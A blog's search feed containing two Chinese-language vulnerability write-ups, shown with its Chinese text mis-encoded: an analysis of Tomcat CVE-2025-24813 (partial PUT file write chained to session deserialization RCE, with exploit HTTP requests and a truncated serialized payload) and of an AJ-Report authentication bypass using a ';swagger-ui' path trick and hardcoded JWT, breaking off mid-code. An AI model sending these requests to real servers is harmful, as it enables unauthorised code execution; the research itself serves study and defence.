<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Tomcat-sessionååºåˆ—åŒ–åˆ†æ</title>
      <link href="/2025/03/Tomcat-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
      <url>/2025/03/Tomcat-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>CVE-2025-24813ï¼Œè·Ÿçš„ä¸æ˜¯å¾ˆç»†ï¼Œå¤§æ¦‚å¤ç°äº†ä¸€ä¸‹</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å¯ä»¥æœ¬åœ°æ­ï¼Œæˆ‘è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥ç”¨dockeräº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  tomcat:</span><br><span class="line">    image: tomcat:<span class="number">9.0</span><span class="number">.8</span>-jre8-slim</span><br><span class="line">    container_name: CVE-<span class="number">2025</span>-<span class="number">24813</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./web.xml:/usr/local/tomcat/conf/web.xml</span><br><span class="line">      - ./context.xml:/usr/local/tomcat/conf/context.xml</span><br><span class="line">      - ./commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">      - <span class="string">&quot;8000:8000&quot;</span></span><br><span class="line">    environment:</span><br><span class="line">      - CATALINA_OPTS=-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠé‡Œé¢çš„libæ‹·å‡ºæ¥åŠ åˆ°ideaåº“é‡Œé¢å³å¯ï¼ˆä¸è¦ç”¨winä¸Šä¸‹è½½çš„tomcatçš„libï¼Œä»£ç ä¼šå¯¹ä¸ä¸Šï¼‰</p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ul><li>DefaultServlet å†™å…¥åŠŸèƒ½å¯ç”¨ï¼šéœ€åœ¨Â <code>web.xml</code>Â ä¸­é…ç½®Â <code>readonly=false</code></li><li>Partial PUT è¯·æ±‚æ”¯æŒï¼šTomcat é»˜è®¤æ”¯æŒåˆ†å—ä¸Šä¼ </li><li>æ–‡ä»¶ä¼šè¯æŒä¹…åŒ–å¯ç”¨ï¼šéœ€åœ¨Â <code>context.xml</code>Â ä¸­é…ç½®Â <code>PersistentManager</code>Â å’ŒÂ <code>FileStore</code></li><li>å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼šç±»è·¯å¾„ä¸‹éœ€åŒ…å«å­˜åœ¨æ¼æ´çš„åº“</li></ul><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><ul><li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li></ul><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="æ–‡ä»¶å†™å…¥"><a href="#æ–‡ä»¶å†™å…¥" class="headerlink" title="æ–‡ä»¶å†™å…¥"></a>æ–‡ä»¶å†™å…¥</h3><p>åŒæ ·æ˜¯PUTè¯·æ±‚é€ æˆçš„ï¼Œè¿™ä¸ªçˆ†å‡ºè€å¤šæ¬¡æ¼æ´äº†ï¼Œä½†æ˜¯ä¹‹å‰æ²¡åˆ†æè¿‡ã€‚ã€‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">        <span class="built_in">this</span>.sendNotAllowed(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.getRelativePath(req);</span><br><span class="line">        <span class="type">WebResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">        <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="built_in">this</span>.parseContentRange(req, resp);</span><br><span class="line">        <span class="keyword">if</span> (range != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">resourceInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (range == IGNORE) &#123;</span><br><span class="line">                    resourceInputStream = req.getInputStream();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br><span class="line">                    resourceInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(contentFile);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.resources.write(path, (InputStream)resourceInputStream, <span class="literal">true</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (resource.exists()) &#123;</span><br><span class="line">                        resp.setStatus(<span class="number">204</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        resp.setStatus(<span class="number">201</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    resp.sendError(<span class="number">409</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (resourceInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        ((InputStream)resourceInputStream).close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var13) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå°±æœ‰ä¸ªif åˆ¤æ–­ï¼ŒreadOnlyé»˜è®¤ä¸ºtrueï¼Œæ‰€ä»¥éœ€è¦æ”¹é…ç½®æ–‡ä»¶ä¸ºfalseæ‰èƒ½èµ°ä¸‹å»</p><p>ç„¶åæ˜¯<code>parseContentRange</code> å‡½æ•°ï¼Œè¿™ä¸ªå³å¤„ç†è¯·æ±‚å¤´ä¸­**<code>Content-Range: bytes 0-1000/1200</code>**çš„é€»è¾‘</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203205211.png" alt="image.png"></p><p>å…ˆç»§ç»­å¾€ä¸‹ï¼Œæ¥åˆ°ä¸‹é¢è¿™ä¸€è¡Œï¼Œè·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å³é€ æˆæ¼æ´çš„ä¸€ä¸ªåœ°æ–¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">tempDir</span> <span class="operator">=</span> (File)<span class="built_in">this</span>.getServletContext().getAttribute(<span class="string">&quot;javax.servlet.context.tempdir&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">convertedResourcePath</span> <span class="operator">=</span> path.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempDir, convertedResourcePath);</span><br></pre></td></tr></table></figure><p>ä¼šè·å–ä¸€ä¸ªä¸´æ—¶ç›®å½•ï¼Œç„¶åå°†è·¯å¾„çš„<code>/</code>æ›¿æ¢ä¸º<code>.</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203215720.png" alt="image.png"></p><p>ä¸´æ—¶ç›®å½•è·¯å¾„ä¸º<code>/usr/local/tomcat/work/Catalina/localhost/ROOT</code> ï¼Œç„¶ååœ¨è¿™ä¸ªç›®å½•åˆ›å»ºäº†ä¸€ä¸ª<code>.poc.session</code> çš„æ–‡ä»¶ï¼Œåç»­åœ¨ä¸‹é¢è®¾ç½®æ–‡ä»¶çš„å¤§å°</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203223838.png" alt="image.png"></p><p>è¿™ä¹Ÿæ˜¯è¯·æ±‚å¤´é‚£ä¹ˆè®¾ç½®çš„åŸå› ï¼Œç›¸å½“äºåˆ†æ®µä¼ è¾“ï¼Œåç»­å°†postä¼ å…¥çš„å†…å®¹å†™å…¥åˆ°åˆ›å»ºçš„æ–‡ä»¶ä¸­</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203240596.png" alt="image.png"></p><p>åç»­ä¼ å…¥æ–‡ä»¶ä¼šæ˜¾ç¤º409</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /poc/session HTTP/1.1</span><br><span class="line">Host: 192.168.188.129:8080</span><br><span class="line">Content-Length: 1000</span><br><span class="line">Content-Range: bytes 0-1000/1200</span><br><span class="line"></span><br><span class="line">&#123;&#123;base64dec(rO0ABXNyABF......)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203246796.png" alt="image.png"></p><p>ä½†æ˜¯å®é™…ä¸Šå·²ç»ä¼ å…¥æˆåŠŸï¼Œå› ä¸ºå†™å…¥çš„é€»è¾‘å·²ç»èµ°å®Œäº†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203252834.png" alt="image.png"></p><p>åç»­å°±æ˜¯åˆ©ç”¨ï¼Œå…¶å®å°±æ˜¯ç»“åˆCVE-2020-9484çš„æ¼æ´</p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p><strong>æ¼æ´ç‚¹åœ¨FileStore#load</strong></p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203300083.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªåœ°æ–¹é»˜è®¤åŠ è½½çš„ç›®å½•å°±æ˜¯æˆ‘ä»¬ä¸Šé¢å†™å…¥æ–‡ä»¶çš„åœ°æ–¹ï¼Œç„¶åä¼šè¿›å…¥åˆ°ä¹‹å‰çš„è€æ´ååºåˆ—åŒ–é€»è¾‘ä¸­</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203324668.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203331394.png" alt="image.png"></p><p>æœ€ç»ˆé€ æˆrce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.188.129:8080</span><br><span class="line">Cookie: JSESSIONID=.poc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250324203341040.png" alt="image.png"></p><p>æ„Ÿè§‰è¿™ä¸ªæ´æ›´åƒæ˜¯CVE-2020-9484çš„ç»•è¿‡ï¼Œæµ‹è¯•çš„æ—¶å€™å‘ç°è¿™ä¸¤ä¸ªåŒ…å‘é€é—´éš”ä¸èƒ½å¤ªé•¿é‚£ä¸ªç¼“å­˜æ–‡ä»¶ä¼¼ä¹ä¼šè‡ªåŠ¨åˆ é™¤</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.bilibili.com/video/BV14dQjYcEc5/?vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV14dQjYcEc5/?vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p><p><a href="https://github.com/charis3306/CVE-2025-24813">https://github.com/charis3306/CVE-2025-24813</a></p><p><a href="https://boogipop.com/2025/03/13/CVE-2025-24813%20Tomcat%20Session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E5%90%88%E6%8B%B3/">https://boogipop.com/2025/03/13/CVE-2025-24813 Tomcat Session ååºåˆ—åŒ–ç»„åˆæ‹³/</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AJ-Report è®¤è¯ç»•è¿‡ä¸è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</title>
      <link href="/2025/03/AJ-Report-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/03/AJ-Report-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰æ‰“ctfçº¿ä¸‹èµ›é‡åˆ°è¿‡è¿™ä¸ªç³»ç»Ÿï¼Œä¸€ç›´æƒ³åˆ†ææ¥ç€ï¼Œæç½®åˆ°ç°åœ¨ã€‚ã€‚ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>&lt;&#x3D;1.4.0</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æ— æ•Œçš„pç¥æ²¡å¾—è¯´ï¼Œè¿˜è´´å¿ƒé…ç½®äº†è°ƒè¯•ç«¯å£</p><p><a href="https://github.com/vulhub/vulhub/blob/master/aj-report/CNVD-2024-15077/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/aj-report/CNVD-2024-15077/README.zh-cn.md</a></p><h2 id="æƒé™ç»•è¿‡"><a href="#æƒé™ç»•è¿‡" class="headerlink" title="æƒé™ç»•è¿‡"></a>æƒé™ç»•è¿‡</h2><p>è¿™ç±»çš„æ¼æ´ä¸€èˆ¬å°±æ˜¯Filterä¹‹ç±»çš„å†™çš„æœ‰é—®é¢˜å¯¼è‡´çš„æƒé™ç»•è¿‡ï¼Œç›´æ¥æ¥åˆ°TokenFilter</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153250196.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç›´æ¥ç”¨äº†<code>getRequestURI</code> è·å–çš„æ¥å£ï¼Œè¿™ä¸ªä¸œè¥¿ä¹‹å‰å°±çˆ†å‡ºæ¥æœ‰è§£æå·®å¼‚å¯¼è‡´çš„æƒé™ç»•è¿‡ï¼Œä¸‹é¢åˆšåˆšå¥½æœ‰ä¸ªurlåŒ…å«<code>swagger-ui</code> å°±ç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆåˆ©ç”¨<code>;</code> å°±å¯ä»¥ç›´æ¥ç»•è¿‡æƒé™æ ¡éªŒ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153300433.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ ·ç›´æ¥å°±ç»•è¿‡äº†æƒé™æ ¡éªŒï¼Œä¹‹å‰æ²¡åˆ†æè¿‡ï¼Œå€Ÿæ­¤åˆ†æä¸€ä¸‹ã€‚</p><h3 id="Tomcatå’ŒgetRequestURIç»“åˆå¯¼è‡´çš„æƒé™ç»•è¿‡"><a href="#Tomcatå’ŒgetRequestURIç»“åˆå¯¼è‡´çš„æƒé™ç»•è¿‡" class="headerlink" title="Tomcatå’ŒgetRequestURIç»“åˆå¯¼è‡´çš„æƒé™ç»•è¿‡"></a>Tomcatå’ŒgetRequestURIç»“åˆå¯¼è‡´çš„æƒé™ç»•è¿‡</h3><p>tomcatçš„å¤„ç†åœ¨<code>CoyoteAdapter.service()</code> æ–¹æ³•ä¸­ï¼Œè¿™é‡Œæˆ‘å¯¹<code>getRequestURI</code> å’Œè¿™ä¸ª<code>service</code> éƒ½ä¸‹äº†æ–­ç‚¹ï¼Œé¦–å…ˆåœ¨<code>service</code> æ–­ä½äº†ï¼Œè¯´æ˜æ˜¯tomcatå…ˆå¤„ç†urlï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service:<span class="number">303</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">374</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">868</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1590</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">750</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„åˆ†å·å¤„ç†æ˜¯åœ¨<code>parsePathParameters</code> ï¼Œè·Ÿä¸€ä¸‹å…·ä½“çš„å¤„ç†è¿‡ç¨‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153308777.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„å¤„ç†æ˜¯å°†<code>;</code> åçš„ç»™æˆªæ–­äº†ï¼Œå¦‚æœæˆªæ–­ä¹‹åè¿˜æœ‰ç¬¬äºŒä¸ªé‚£ä¹ˆå°±ç»§ç»­å¾ªç¯å¤„ç†ç›´åˆ°æ²¡æœ‰ï¼Œå…·ä½“çš„ä¸€æ­¥æ­¥è¿™é‡Œå°±ä¸å†™äº†å¤ªå¤šäº†ï¼Œä½†æ˜¯ä¼¼ä¹å¹¶æ²¡æœ‰è¿”å›ä»€ä¹ˆï¼Œå…ˆç»§ç»­å¾€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pathParamEnd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (charset != <span class="literal">null</span>) &#123;</span><br><span class="line">        pv = <span class="keyword">new</span> <span class="title class_">String</span>(uriBC.getBuffer(), start + pathParamStart,</span><br><span class="line">                    pathParamEnd - pathParamStart, charset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Extract path param from decoded request URI</span></span><br><span class="line">    <span class="type">byte</span>[] buf = uriBC.getBuffer();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; end - start - pathParamEnd; i++) &#123;</span><br><span class="line">        buf[start + semicolon + i]</span><br><span class="line">            = buf[start + i + pathParamEnd];</span><br><span class="line">    &#125;</span><br><span class="line">    uriBC.setBytes(buf, start,</span><br><span class="line">            end - start - pathParamEnd + semicolon);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (charset != <span class="literal">null</span>) &#123;</span><br><span class="line">        pv = <span class="keyword">new</span> <span class="title class_">String</span>(uriBC.getBuffer(), start + pathParamStart,</span><br><span class="line">                    (end - start) - pathParamStart, charset);</span><br><span class="line">    &#125;</span><br><span class="line">    uriBC.setEnd(start + semicolon);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯è¿™æ®µä»£ç </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153319715.png" alt="image.png"></p><p>ifä¸­æ˜¯åœ¨æ‰¾åˆ°<code>;</code>ä¹‹åçš„ç¬¬ä¸€ä¸ª<code>/</code> å¤„ç†æƒ…å†µï¼Œå³å°†<code>/</code> ä¹‹åçš„ç›´æ¥è¦†ç›–<code>;åˆ°/</code> ä¹‹é—´çš„å­—ç¬¦ï¼Œè€Œelseå°±æ˜¯åœ¨<code>;</code> ä¹‹åæ²¡æ‰¾åˆ°<code>/</code> ï¼Œé‚£ä¹ˆå°±ç›´æ¥å»æ‰<code>;</code>ä¹‹åçš„å­—ç¬¦</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153325008.png" alt="image.png"></p><p>æœ€ç»ˆurlè§£æå°±å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153329502.png" alt="image.png"></p><p>æ­¤æ—¶<code>getRequestURI()</code> å†è¿›è¡Œè·å–</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153334724.png" alt="image.png"></p><p>è¿™é‡Œè·å–æ˜¯ç›´æ¥è¿”å›åŸæœ¬çš„å­—ç¬¦ï¼Œä¸è¿›è¡Œä»»ä½•å¤„ç†ï¼Œè€Œä¸‹é¢åˆæœ‰è¿™æ ·ä¸€æ®µä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swaggerç›¸å…³çš„ç›´æ¥æ”¾è¡Œ</span></span><br><span class="line"><span class="keyword">if</span> (uri.contains(<span class="string">&quot;swagger-ui&quot;</span>) || uri.contains(<span class="string">&quot;swagger-resources&quot;</span>)) &#123;</span><br><span class="line">    filterChain.doFilter(request, response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†åŠ ä¸Štomcatå¤„ç†æ˜ å°„æ˜¯åŸºäºtomcatå¤„ç†åçš„ç»“æœè¿›è¡Œæ˜ å°„ï¼Œæ‰€ä»¥å¯¼è‡´äº†æƒé™ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153341763.png" alt="image.png"></p><aside>ğŸ’¡<p>å°æ€»ç»“ï¼š</p><p>tomcatå¤„ç†<code>/dataSetParam/verification/;swagger-ui</code>å˜ä¸º<code>/dataSetParam/verification</code>ï¼Œè€Œ<code>getRequestURI()</code> è·å–åˆ°çš„æ˜¯åŸæœ¬ä¸å˜çš„ï¼Œä½†æ˜¯è·¯ç”±æ˜ å°„ç”¨çš„åˆæ˜¯tomcatå¤„ç†çš„ç»“æœï¼Œæ‰€ä»¥å¯¼è‡´è¿™ä¸ªå·®å¼‚è§£æèƒ½è¿›è¡Œæƒé™ç»•è¿‡</p></aside><p>åœ¨<code>parsePathParameters</code>å¤„ç†å®Œè¿˜æœ‰<code>normalize</code> çš„å¤„ç†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153408138.png" alt="image.png"></p><p>è¿™é‡Œæ³¨é‡Šå†™äº†å¤„ç†çš„æƒ…å†µæ˜¯<code>\ // /./ /../</code> è¿™å››ç§ï¼Œå…·ä½“å°±ä¸ä¸€æ­¥æ­¥åˆ†æäº†ï¼Œç›´æ¥çœ‹gptç»“æœ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153412561.png" alt="image.png"></p><p>ç›¸å½“äºæ˜¯åšä¸€ä¸ªæ ‡å‡†åŒ–</p><h3 id="JWTç¡¬ç¼–ç å¯¼è‡´çš„æƒé™ç»•è¿‡"><a href="#JWTç¡¬ç¼–ç å¯¼è‡´çš„æƒé™ç»•è¿‡" class="headerlink" title="JWTç¡¬ç¼–ç å¯¼è‡´çš„æƒé™ç»•è¿‡"></a>JWTç¡¬ç¼–ç å¯¼è‡´çš„æƒé™ç»•è¿‡</h3><p>è¿™é‡Œåœ¨ä¸Šé¢çš„æ ¡éªŒå®Œæˆåä¼šæœ‰ä¸€ä¸ªjwtçš„æ ¡éªŒ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153417400.png" alt="image.png"></p><p>è·Ÿè¸ªä¸€ä¸‹è¿™é‡Œjwtæ˜¯æ€ä¹ˆç”Ÿæˆçš„ï¼Œä¸€èˆ¬çš„ç”Ÿæˆè°ƒç”¨ä¼šåœ¨ç™»å½•å¤„</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153423963.png" alt="image.png"></p><p>è·Ÿè¸ªè¿™ä¸ªloginçš„å®ç°</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153429413.png" alt="image.png"></p><p>åœ¨AccessUserServiceImpl.javaä¸‹æ‰¾åˆ°è°ƒç”¨åˆ›å»ºjwtçš„æ–¹æ³•ï¼Œè·Ÿè¿›å»å¾—åˆ°åˆ›å»ºé€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">createToken</span><span class="params">(String username, String uuid, Integer type, String tenantCode)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JWT.create().withClaim(<span class="string">&quot;username&quot;</span>, 